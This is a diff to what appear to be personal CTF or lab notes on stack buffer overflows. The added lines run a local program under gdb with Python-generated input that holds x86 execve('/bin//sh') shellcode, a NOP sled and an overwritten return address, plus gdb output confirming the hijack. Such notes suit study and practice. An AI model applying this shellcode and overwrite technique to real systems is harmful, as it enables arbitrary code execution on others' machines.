@@ -57,6 +57,23 @@ Desktop cyclic -l 0x61616175
 
 also u can use the syntax:
 `run < <(python -c 'print("dat_wil\nAAAA\n")')`
+`run < <(python -c 'print("dat_wil")' && python -c 'print("AAAA")')` / `run < <(python -c 'print "dat_wil"' && python -c 'print "AAAA"')`
+
+```
+run < <(python -c 'print "dat_wil"' && python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 +  "\xff\xff\xd6\x9c"[::-1]')
+
+
+x $ebp+4
+0xffffd6ec:	0xffffd69c
+
+x *0xffffd6ec
+0xffffd69c:	0x99580b6a
+```
+
+
+
+
+
 
 
 
